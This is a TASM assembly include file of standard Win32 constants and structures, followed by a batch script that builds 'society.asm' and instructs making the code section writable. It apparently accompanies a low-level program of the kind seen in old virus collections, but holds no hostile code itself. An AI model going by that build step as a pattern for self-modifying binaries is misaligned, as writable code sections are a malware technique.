EDGE_SUNKEN             equ     BDR_SUNKENOUTER + BDR_SUNKENINNER
EDGE_ETCHED             equ     BDR_SUNKENOUTER + BDR_RAISEDINNER
EDGE_BUMP               equ     BDR_RAISEDOUTER + BDR_SUNKENINNER
BF_LEFT                 equ     01h
BF_TOP                  equ     02h
BF_RIGHT                equ     04h
BF_BOTTOM               equ     08h
BF_RECT                 equ     BF_LEFT + BF_TOP + BF_RIGHT + BF_BOTTOM
IDOK                            equ     1
IDCANCEL                        equ     2
IDABORT                         equ     3
IDRETRY                         equ     4
IDIGNORE                        equ     5
IDYES                           equ     6
IDNO                            equ     7
IDCLOSE                         equ     8
IDHELP                          equ     9
COLOR_BTNFACE                        equ 15
DLGWINDOWEXTRA                       equ 30
IDC_ARROW                            equ 32512
WM_CTLCOLORDLG                       equ 136h
WM_SETFOCUS equ 7
WM_KEYFIRST                     equ     0100h
WM_KEYDOWN                      equ     0100h
WM_KEYUP                        equ     0101h
WM_CHAR                         equ     0102h
WM_DEADCHAR                     equ     0103h
WM_SYSKEYDOWN                   equ     0104h
WM_SYSKEYUP                     equ     0105h
WM_SYSCHAR                      equ     0106h
WM_SYSDEADCHAR                  equ     0107h
WM_KEYLAST                      equ     0108h
WM_SETICON equ 80h

DS_3DLOOK           equ 0004H
DS_FIXEDSYS         equ 0008H
DS_NOFAILCREATE     equ 0010H
DS_CONTROL          equ 0400H
DS_CENTER           equ 0800H
DS_CENTERMOUSE      equ 1000H
DS_CONTEXTHELP      equ 2000H
DS_ABSALIGN         equ 01h
DS_SYSMODAL         equ 02h
DS_LOCALEDIT        equ 20h
DS_SETFONT          equ 40h
DS_MODALFRAME       equ 80h
DS_NOIDLEMSG        equ 100h
DS_SETFOREGROUND    equ 200h

FILE_FLAG_WRITE_THROUGH         equ 80000000h
FILE_FLAG_OVERLAPPED            equ 40000000h
FILE_FLAG_NO_BUFFERING          equ 20000000h
FILE_FLAG_RANDOM_ACCESS         equ 10000000h
FILE_FLAG_SequENTIAL_SCAN       equ 08000000h
FILE_FLAG_DELETE_ON_CLOSE       equ 04000000h
FILE_FLAG_BACKUP_SEMANTICS      equ 02000000h
FILE_FLAG_POSIX_SEMANTICS       equ 01000000h

CREATE_NEW          equ 1
CREATE_ALWAYS       equ 2
OPEN_EXISTING       equ 3
OPEN_ALWAYS         equ 4
TRUNCATE_EXISTING   equ 5

GMEM_FIXED          equ 0000h
GMEM_MOVEABLE       equ 0002h
GMEM_NOCOMPACT      equ 0010h
GMEM_NODISCARD      equ 0020h
GMEM_ZEROINIT       equ 0040h
GMEM_MODIFY         equ 0080h
GMEM_DISCARDABLE    equ 0100h
GMEM_NOT_BANKED     equ 1000h
GMEM_SHARE          equ 2000h
GMEM_DDESHARE       equ 2000h
GMEM_NOTIFY         equ 4000h
GMEM_LOWER          equ GMEM_NOT_BANKED
GMEM_VALID_FLAGS    equ 7F72h
GMEM_INVALID_HANDLE equ 8000h


LMEM_FIXED          equ 0000h
LMEM_MOVEABLE       equ 0002h
LMEM_NOCOMPACT      equ 0010h
LMEM_NODISCARD      equ 0020h
LMEM_ZEROINIT       equ 0040h
LMEM_MODIFY         equ 0080h
LMEM_DISCARDABLE    equ 0F00h
LMEM_VALID_FLAGS    equ 0F72h
LMEM_INVALID_HANDLE equ 8000h
                    
LHND                equ (LMEM_MOVEABLE or LMEM_ZEROINIT)
LPTR                equ (LMEM_FIXED or LMEM_ZEROINIT)
                    
NONZEROLHND         equ (LMEM_MOVEABLE)
NONZEROLPTR         equ (LMEM_FIXED)
LMEM_DISCARDED      equ 4000h
LMEM_LOCKCOUNT      equ 00FFh
DRIVE_UNKNOWN     equ 0 
DRIVE_NO_ROOT_DIR equ 1 
DRIVE_REMOVABLE   equ 2 
DRIVE_FIXED       equ 3 
DRIVE_REMOTE      equ 4 
DRIVE_CDROM       equ 5 
DRIVE_RAMDISK     equ 6 
FILE_TYPE_UNKNOWN   equ 0000h
FILE_TYPE_DISK      equ 0001h
FILE_TYPE_CHAR      equ 0002h
FILE_TYPE_PIPE      equ 0003h
FILE_TYPE_REMOTE    equ 8000h

;================================ WINNT.H ===============
FILE_READ_DATA            equ ( 0001h )
FILE_LIST_DIRECTORY       equ ( 0001h )
FILE_WRITE_DATA           equ ( 0002h )
FILE_ADD_FILE             equ ( 0002h )
FILE_APPEND_DATA          equ ( 0004h )
FILE_ADD_SUBDIRECTORY     equ ( 0004h )
FILE_CREATE_PIPE_INSTANCE equ ( 0004h )
FILE_READ_EA              equ ( 0008h )
FILE_WRITE_EA             equ ( 0010h )
FILE_EXECUTE              equ ( 0020h )
FILE_TRAVERSE             equ ( 0020h )
FILE_DELETE_CHILD         equ ( 0040h )
FILE_READ_ATTRIBUTES      equ ( 0080h )
FILE_WRITE_ATTRIBUTES     equ ( 0100h )

;FILE_ALL_ACCESS      equ (STANDARD_RIGHTS_RequIRED or SYNCHRONIZE or 1FFh)
;FILE_GENERIC_READ    equ (STANDARD_RIGHTS_READ or FILE_READ_DATA or FILE_READ_ATTRIBUTES or FILE_READ_EA or SYNCHRONIZE)
;FILE_GENERIC_WRITE   equ (STANDARD_RIGHTS_WRITE or FILE_WRITE_DATA or FILE_WRITE_ATTRIBUTES or FILE_WRITE_EA or FILE_APPEND_DATA or SYNCHRONIZE)
;FILE_GENERIC_EXECUTE equ (STANDARD_RIGHTS_EXECUTE or FILE_READ_ATTRIBUTES or FILE_EXECUTE or SYNCHRONIZE)

FILE_SHARE_READ                 equ 00000001h
FILE_SHARE_WRITE                equ 00000002h  
FILE_SHARE_DELETE               equ 00000004h  
FILE_ATTRIBUTE_READONLY         equ 00000001h  
FILE_ATTRIBUTE_HIDDEN           equ 00000002h  
FILE_ATTRIBUTE_SYSTEM           equ 00000004h  
FILE_ATTRIBUTE_DIRECTORY        equ 00000010h  
FILE_ATTRIBUTE_ARCHIVE          equ 00000020h  
FILE_ATTRIBUTE_NORMAL           equ 00000080h  
FILE_ATTRIBUTE_TEMPORARY        equ 00000100h  
FILE_ATTRIBUTE_COMPRESSED       equ 00000800h  
FILE_ATTRIBUTE_OFFLINE          equ 00001000h  
FILE_NOTIFY_CHANGE_FILE_NAME    equ 00000001h   
FILE_NOTIFY_CHANGE_DIR_NAME     equ 00000002h   
FILE_NOTIFY_CHANGE_ATTRIBUTES   equ 00000004h   
FILE_NOTIFY_CHANGE_SIZE         equ 00000008h   
FILE_NOTIFY_CHANGE_LAST_WRITE   equ 00000010h   
FILE_NOTIFY_CHANGE_LAST_ACCESS  equ 00000020h   
FILE_NOTIFY_CHANGE_CREATION     equ 00000040h   
FILE_NOTIFY_CHANGE_SECURITY     equ 00000100h   
FILE_ACTION_ADDED               equ 00000001h   
FILE_ACTION_REMOVED             equ 00000002h   
FILE_ACTION_MODIFIED            equ 00000003h   
FILE_ACTION_RENAMED_OLD_NAME    equ 00000004h   
FILE_ACTION_RENAMED_NEW_NAME    equ 00000005h   
FILE_CASE_SENSITIVE_SEARCH      equ 00000001h  
FILE_CASE_PRESERVED_NAMES       equ 00000002h  
FILE_UNICODE_ON_DISK            equ 00000004h  
FILE_PERSISTENT_ACLS            equ 00000008h  
FILE_FILE_COMPRESSION           equ 00000010h  
FILE_VOLUME_IS_COMPRESSED       equ 00008000h  
GENERIC_READ                    equ 80000000h
GENERIC_WRITE                   equ 40000000h
GENERIC_EXECUTE                 equ 20000000h
GENERIC_ALL                     equ 10000000h

DELETE                          equ  00010000h
READ_CONTROL                    equ  00020000h
WRITE_DAC                       equ  00040000h
WRITE_OWNER                     equ  00080000h
SYNCHRONIZE                     equ  00100000h
STANDARD_RIGHTS_RequIRED        equ  000F0000h
STANDARD_RIGHTS_READ            equ  READ_CONTROL
STANDARD_RIGHTS_WRITE           equ  READ_CONTROL
STANDARD_RIGHTS_EXECUTE         equ  READ_CONTROL
STANDARD_RIGHTS_ALL             equ  001F0000h
SPECIFIC_RIGHTS_ALL             equ  0000FFFFh

FILE_BEGIN           equ 0
FILE_CURRENT         equ 1
FILE_END             equ 2

ES_LEFT             equ 0000h
ES_CENTER           equ 0001h
ES_RIGHT            equ 0002h
ES_MULTILINE        equ 0004h
ES_UPPERCASE        equ 0008h
ES_LOWERCASE        equ 0010h
ES_PASSWORD         equ 0020h
ES_AUTOVSCROLL      equ 0040h
ES_AUTOHSCROLL      equ 0080h
ES_NOHIDESEL        equ 0100h
ES_OEMCONVERT       equ 0400h
ES_READONLY         equ 0800h
ES_WANTRETURN       equ 1000h
EN_SETFOCUS         equ 0100h
EN_KILLFOCUS        equ 0200h
EN_CHANGE           equ 0300h
EN_UPDATE           equ 0400h
EN_ERRSPACE         equ 0500h
EN_MAXTEXT          equ 0501h
EN_HSCROLL          equ 0601h
EN_VSCROLL          equ 0602h
EC_LEFTMARGIN       equ 0001h
EC_RIGHTMARGIN      equ 0002h
EC_USEFONTINFO      equ 0ffffh
EM_GETSEL               equ 00B0h
EM_SETSEL               equ 00B1h
EM_GETRECT              equ 00B2h
EM_SETRECT              equ 00B3h
EM_SETRECTNP            equ 00B4h
EM_SCROLL               equ 00B5h
EM_LINESCROLL           equ 00B6h
EM_SCROLLCARET          equ 00B7h
EM_GETMODIFY            equ 00B8h
EM_SETMODIFY            equ 00B9h
EM_GETLINECOUNT         equ 00BAh
EM_LINEINDEX            equ 00BBh
EM_SETHANDLE            equ 00BCh
EM_GETHANDLE            equ 00BDh
EM_GETTHUMB             equ 00BEh
EM_LINELENGTH           equ 00C1h
EM_REPLACESEL           equ 00C2h
EM_GETLINE              equ 00C4h
EM_LIMITTEXT            equ 00C5h
EM_CANUNDO              equ 00C6h
EM_UNDO                 equ 00C7h
EM_FMTLINES             equ 00C8h
EM_LINEFROMCHAR         equ 00C9h
EM_SETTABSTOPS          equ 00CBh
EM_SETPASSWORDCHAR      equ 00CCh
EM_EMPTYUNDOBUFFER      equ 00CDh
EM_GETFIRSTVISIBLELINE  equ 00CEh
EM_SETREADONLY          equ 00CFh
EM_SETWORDBREAKPROC     equ 00D0h
EM_GETWORDBREAKPROC     equ 00D1h
EM_GETPASSWORDCHAR      equ 00D2h
EM_SETMARGINS           equ 00D3h
EM_GETMARGINS           equ 00D4
EM_SETLIMITTEXT         equ EM_LIMITTEXT
EM_GETLIMITTEXT         equ 00D5h
EM_POSFROMCHAR          equ 00D6h
EM_CHARFROMPOS          equ 00D7h
WB_LEFT           equ  0        
WB_RIGHT          equ  1        
WB_ISDELIMITER    equ  2        
BS_PUSHBUTTON     equ   00000000h
BS_DEFPUSHBUTTON  equ   00000001h
BS_CHECKBOX       equ   00000002h
BS_AUTOCHECKBOX   equ   00000003h
BS_RADIOBUTTON    equ   00000004h
BS_3STATE         equ   00000005h
BS_AUTO3STATE     equ   00000006h
BS_GROUPBOX       equ   00000007h
BS_USERBUTTON     equ   00000008h
BS_AUTORADIOBUTTON equ   00000009h
BS_OWNERDRAW      equ   0000000Bh
BS_LEFTTEXT       equ   00000020h
BS_TEXT           equ   00000000h
BS_ICON           equ   00000040h
BS_BITMAP         equ   00000080h
BS_LEFT           equ   00000100h
BS_RIGHT          equ   00000200h
BS_CENTER         equ   00000300h
BS_TOP            equ   00000400h
BS_BOTTOM         equ   00000800h
BS_VCENTER        equ   00000C00h
BS_PUSHLIKE       equ   00001000h
BS_MULTILINE      equ   00002000h
BS_NOTIFY         equ   00004000h
BS_FLAT           equ   00008000h
BS_RIGHTBUTTON    equ   BS_LEFTTEXT
BN_CLICKED        equ   0       
BN_PAINT          equ   1       
BN_HILITE         equ   2       
BN_UNHILITE       equ   3       
BN_DISABLE        equ   4       
BN_DOUBLECLICKED  equ   5       
BN_PUSHED         equ   BN_HILITE
BN_UNPUSHED       equ   BN_UNHILITE
BN_DBLCLK         equ   BN_DOUBLECLICKED
BN_SETFOCUS       equ   6
BN_KILLFOCUS      equ   7
BM_GETCHECK       equ  00F0h
BM_SETCHECK       equ  00F1h
BM_GETSTATE       equ  00F2h
BM_SETSTATE       equ  00F3h
BM_SETSTYLE       equ  00F4h
BM_CLICK          equ  00F5h
BM_GETIMAGE       equ  00F6h
BM_SETIMAGE       equ  00F7h
BST_UNCHECKED     equ  0000h
BST_CHECKED       equ  0001h
BST_INDETERMINATE equ  0002h
BST_PUSHED        equ  0004h
BST_FOCUS         equ  0008h
SS_LEFT           equ   00000000h
SS_CENTER         equ   00000001h
SS_RIGHT          equ   00000002h
SS_ICON           equ   00000003h
SS_BLACKRECT      equ   00000004h
SS_GRAYRECT       equ   00000005h
SS_WHITERECT      equ   00000006h
SS_BLACKFRAME     equ   00000007h
SS_GRAYFRAME      equ   00000008h
SS_WHITEFRAME     equ   00000009h
SS_USERITEM       equ   0000000Ah
SS_SIMPLE         equ   0000000Bh
SS_LEFTNOWORDWRAP equ   0000000Ch
SS_OWNERDRAW      equ   0000000Dh
SS_BITMAP         equ   0000000Eh
SS_ENHMETAFILE    equ   0000000Fh
SS_ETCHEDHORZ     equ   00000010h
SS_ETCHEDVERT     equ   00000011h
SS_ETCHEDFRAME    equ   00000012h
SS_TYPEMASK       equ   0000001Fh
SS_NOTIFY         equ   00000100h
SS_CENTERIMAGE    equ   00000200h
SS_RIGHTJUST      equ   00000400h
SS_REALSIZEIMAGE  equ   00000800h
SS_SUNKEN         equ   00001000h
SS_ENDELLIPSIS    equ   00004000h
SS_PATHELLIPSIS   equ   00008000h
SS_WORDELLIPSIS   equ   0000C000h
SS_ELLIPSISMASK   equ   0000C000h

CDN_FIRST   equ (0-601)
CDN_LAST    equ (0-699)
OFN_READONLY                 equ 00000001h
OFN_OVERWRITEPROMPT          equ 00000002h
OFN_HIDEREADONLY             equ 00000004h
OFN_NOCHANGEDIR              equ 00000008h
OFN_SHOWHELP                 equ 00000010h
OFN_ENABLEHOOK               equ 00000020h
OFN_ENABLETEMPLATE           equ 00000040h
OFN_ENABLETEMPLATEHANDLE     equ 00000080h
OFN_NOVALIDATE               equ 00000100h
OFN_ALLOWMULTISELECT         equ 00000200h
OFN_EXTENSIONDIFFERENT       equ 00000400h
OFN_PATHMUSTEXIST            equ 00000800h
OFN_FILEMUSTEXIST            equ 00001000h
OFN_CREATEPROMPT             equ 00002000h
OFN_SHAREAWARE               equ 00004000h
OFN_NOREADONLYRETURN         equ 00008000h
OFN_NOTESTFILECREATE         equ 00010000h
OFN_NONETWORKBUTTON          equ 00020000h
OFN_NOLONGNAMES              equ 00040000h   
OFN_EXPLORER                 equ 00080000h   
OFN_NODEREFERENCELINKS       equ 00100000h
OFN_LONGNAMES                equ 00200000h   
OFN_SHAREFALLTHROUGH    equ  2   
OFN_SHARENOWARN         equ  1
OFN_SHAREWARN           equ  0
CDN_INITDONE            equ (CDN_FIRST - 0000)
CDN_SELCHANGE           equ (CDN_FIRST - 0001)
CDN_FOLDERCHANGE        equ (CDN_FIRST - 0002)
CDN_SHAREVIOLATION      equ (CDN_FIRST - 0003)
CDN_HELP                equ (CDN_FIRST - 0004)
CDN_FILEOK              equ (CDN_FIRST - 0005)
CDN_TYPECHANGE          equ (CDN_FIRST - 0006)

DEBUG_PROCESS               equ 00000001h
DEBUG_ONLY_THIS_PROCESS     equ 00000002h
CREATE_SUSPENDED            equ 00000004h
DETACHED_PROCESS            equ 00000008h
CREATE_NEW_CONSOLE          equ 00000010h
NORMAL_PRIORITY_CLASS       equ 00000020h
IDLE_PRIORITY_CLASS         equ 00000040h
HIGH_PRIORITY_CLASS         equ 00000080h
REALTIME_PRIORITY_CLASS     equ 00000100h
CREATE_NEW_PROCESS_GROUP    equ 00000200h
CREATE_UNICODE_ENVIRONMENT  equ 00000400h
CREATE_SEPARATE_WOW_VDM     equ 00000800h
CREATE_SHARED_WOW_VDM       equ 00001000h
CREATE_FORCEDOS             equ 00002000h
CREATE_DEFAULT_ERROR_MODE   equ 04000000h
CREATE_NO_WINDOW            equ 08000000h
PROFILE_USER                equ 10000000h
PROFILE_KERNEL              equ 20000000h
PROFILE_SERVER              equ 40000000h

MAXLONGLONG equ (7fffffffffffffffh)
MAXLONG     equ 7fffffffh
MAXBYTE     equ 0ffh
MAXWORD     equ 0ffffh
MAXDWORD    equ 0ffffffffh
MINCHAR     equ 80h
MAXCHAR     equ 07fh
MINSHORT    equ 8000h
MAXSHORT    equ 7fffh
MINLONG     equ 80000000h

THREAD_BASE_PRIORITY_LOWRT  equ 15  ;// value that gets a thread to LowRealtime-1
THREAD_BASE_PRIORITY_MAX    equ 2   ;// maximum thread base priority boost
THREAD_BASE_PRIORITY_MIN    equ -2  ;// minimum thread base priority boost
THREAD_BASE_PRIORITY_IDLE   equ -15 ;// value that gets a thread to idle
THREAD_PRIORITY_LOWEST          equ THREAD_BASE_PRIORITY_MIN
THREAD_PRIORITY_BELOW_NORMAL    equ (THREAD_PRIORITY_LOWEST+1)
THREAD_PRIORITY_NORMAL          equ 0
THREAD_PRIORITY_HIGHEST         equ THREAD_BASE_PRIORITY_MAX
THREAD_PRIORITY_ABOVE_NORMAL    equ (THREAD_PRIORITY_HIGHEST-1)
THREAD_PRIORITY_ERROR_RETURN    equ (MAXLONG)
THREAD_PRIORITY_TIME_CRITICAL   equ THREAD_BASE_PRIORITY_LOWRT
THREAD_PRIORITY_IDLE            equ THREAD_BASE_PRIORITY_IDLE

HKEY_CLASSES_ROOT      equ      80000000h
HKEY_CURRENT_USER      equ      80000001h
HKEY_LOCAL_MACHINE     equ      80000002h
HKEY_USERS             equ      80000003h
HKEY_PERFORMANCE_DATA  equ      80000004h
HKEY_CURRENT_CONFIG    equ      80000005h
HKEY_DYN_DATA          equ      80000006h
 
REG_OPTION_RESERVED     equ 00000000h
REG_OPTION_NON_VOLATILE equ 00000000h
REG_OPTION_VOLATILE     equ 00000001h
REG_OPTION_CREATE_LINK  equ 00000002h
REG_OPTION_BACKUP_RESTORE equ 00000004h
REG_OPTION_OPEN_LINK    equ 00000008h
REG_LEGAL_OPTION        equ REG_OPTION_RESERVED or REG_OPTION_NON_VOLATILE or REG_OPTION_VOLATILE or REG_OPTION_CREATE_LINK or REG_OPTION_BACKUP_RESTORE or REG_OPTION_OPEN_LINK
REG_CREATED_NEW_KEY     equ 00000001h
REG_OPENED_EXISTING_KEY equ 00000002h
REG_WHOLE_HIVE_VOLATILE equ 00000001h
REG_REFRESH_HIVE        equ 00000002h
REG_NO_LAZY_FLUSH       equ 00000004h
REG_NOTIFY_CHANGE_NAME       equ     00000001h
REG_NOTIFY_CHANGE_ATTRIBUTES equ     00000002h
REG_NOTIFY_CHANGE_LAST_SET   equ     00000004h
REG_NOTIFY_CHANGE_SECURITY   equ     00000008h
REG_LEGAL_CHANGE_FILTER      equ     REG_NOTIFY_CHANGE_NAME or REG_NOTIFY_CHANGE_ATTRIBUTES or REG_NOTIFY_CHANGE_LAST_SET or REG_NOTIFY_CHANGE_SECURITY
REG_NONE            equ     0
REG_SZ              equ     1
REG_EXPAND_SZ       equ     2
REG_BINARY          equ     3
REG_DWORD           equ     4
REG_DWORD_LITTLE_ENDIAN     equ 4 
REG_DWORD_BIG_ENDIAN        equ 5 
REG_LINK            equ     6
REG_MULTI_SZ        equ     7
REG_RESOURCE_LIST   equ     8
REG_FULL_RESOURCE_DESCRIPTOR   equ 9 
REG_RESOURCE_RequIREMENTS_LIST equ 10

KEY_QUERY_VALUE     equ     0001h
KEY_SET_VALUE       equ     0002h
KEY_CREATE_SUB_KEY  equ     0004h
KEY_ENUMERATE_SUB_KEYS equ  0008h
KEY_NOTIFY          equ     0010h
KEY_CREATE_LINK     equ     0020h

KEY_READ            equ     (STANDARD_RIGHTS_READ or KEY_QUERY_VALUE or KEY_ENUMERATE_SUB_KEYS or KEY_NOTIFY) and (not SYNCHRONIZE)
KEY_WRITE           equ     (STANDARD_RIGHTS_WRITE or KEY_SET_VALUE or KEY_CREATE_SUB_KEY) and (not SYNCHRONIZE)
KEY_EXECUTE         equ     (KEY_READ) and (not SYNCHRONIZE)
KEY_ALL_ACCESS      equ     (STANDARD_RIGHTS_ALL or KEY_QUERY_VALUE or KEY_SET_VALUE or KEY_CREATE_SUB_KEY or KEY_ENUMERATE_SUB_KEYS or KEY_NOTIFY or KEY_CREATE_LINK) and (not SYNCHRONIZE)
SERVICE_KERNEL_DRIVER                   equ     000000001h
SERVICE_FILE_SYSTEM_DRIVER              equ     000000002h
SERVICE_ADAPTER     equ     000000004h
SERVICE_RECOGNIZER_DRIVER               equ     000000008h
SERVICE_DRIVER      equ     SERVICE_KERNEL_DRIVER or SERVICE_FILE_SYSTEM_DRIVER or SERVICE_RECOGNIZER_DRIVER
SERVICE_WIN32_OWN_PROCESS               equ     000000010h
SERVICE_WIN32_SHARE_PROCESS             equ     000000020h
SERVICE_WIN32       equ     SERVICE_WIN32_OWN_PROCESS or SERVICE_WIN32_SHARE_PROCESS
SERVICE_INTERACTIVE_PROCESS             equ     000000100h
SERVICE_TYPE_ALL    equ     SERVICE_WIN32 or SERVICE_ADAPTER or SERVICE_DRIVER or SERVICE_INTERACTIVE_PROCESS
SERVICE_BOOT_START  equ     0
SERVICE_SYSTEM_START          equ     000000001h
SERVICE_AUTO_START  equ     000000002h
SERVICE_DEMAND_START          equ     000000003h
SERVICE_DISABLED    equ     000000004h
SERVICE_ERROR_IGNORE          equ     0
SERVICE_ERROR_NORMAL          equ     000000001h
SERVICE_ERROR_SEVERE          equ     000000002h
SERVICE_ERROR_CRITICAL        equ     000000003h

; ====================================================================
@wordalign macro Adr,x
        if (($-Adr)/2) NE (($-Adr+1)/2) 
            db x
        endif
        endm
@dwordalign macro Adr,x
        if 4-(($-Adr) mod 4)
            db 4-(($-Adr) mod 4) dup (x)
        endif
        endm

f_struc                struc                         ; win32 "searchrec"
                                                     ; structure
ff_attr                 dd      ?
ff_time_create          dd      ?,?
ff_time_lastaccess      dd      ?,?
ff_time_lastwrite       dd      ?,?
ff_size_hi              dd      ?
ff_size                 dd      ?
                        dd      ?,?
ff_fullname             db      260 dup (?) 
                        

ff_shortname            db      14 dup (?)

                        ends

;GDI strucs

WNDCLASSEX	struc
	cbSize		dd	?
	style		dd	?
	lpfnWndProc	dd	?
	cbClsExtra	dd	?
	cbWndExtra	dd	?
	hInstance	dd	?
	hIcon		dd	?
	hCursor		dd	?
	hbrBackground	dd	?
	lpszMenuName	dd	?
	lpszClassName	dd	?
	hIconSm		dd	?
WNDCLASSEX	ends

MSG	struc
	hwnd	dd	?
	message	dd	?
	wParam	dd	?
	lParam	dd	?
	time	dd	?
	pt	dd	?
MSG	ends

RECT    struc
        left    dd      ?
        top     dd      ?
        right   dd      ?
        bottom  dd      ?
RECT    ends

PAINTSTRUCT struc 
         hdc         dd      ? 
         fErase      dd      ?
         rcPaint     RECT<,,,>
         fRestore    dd      ?
         fIncUpdate  dd    ? 
         rgbReserved db 32 dup(?) 
PAINTSTRUCT ends
 





CW_USEDEFAULT		equ	80000000h
SW_SHOWNORMAL		equ	1
COLOR_WINDOW		equ	5
IDI_APPLICATION		equ	32512
WS_OVERLAPPEDWINDOW 	equ	0CF0000h

DT_TOP                  equ    0
DT_LEFT                 equ    0
DT_CENTER               equ    1
DT_RIGHT                equ    2
DT_VCENTER              equ    4
DT_BOTTOM               equ    8
DT_WORDBREAK            equ    10h
DT_SINGLELINE           equ    20h
DT_EXPANDTABS           equ    40h
DT_TABSTOP              equ    80h
DT_NOCLIP               equ    100h
DT_EXTERNALLEADING      equ    200h
DT_CALCRECT             equ    400h
DT_NOPREFIX             equ    800h
DT_INTERNAL             equ    1000h


Pushad_Struc	STRUC
_edi		DD	?
_esi		DD	?
_ebp		DD	?
_esp		DD	?
_ebx		DD	?
_edx		DD	?
_ecx		DD	?
_eax		DD	?
Pushad_Struc	ENDS
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[WIN.INC]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKE.BAT]ÄÄÄ
@echo off
tasm /m /ml society.asm >nul
if not exist society.obj goto err
tlink32 /Tpe /aa /x /c society.obj,,,f:\asm\inc\import32.lib >nul
del society.obj           >nul         
echo Make code section r/w.! 
goto end
:err
echo ********* ERROR! *********
:end
@echo on
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MAKE.BAT]ÄÄÄ
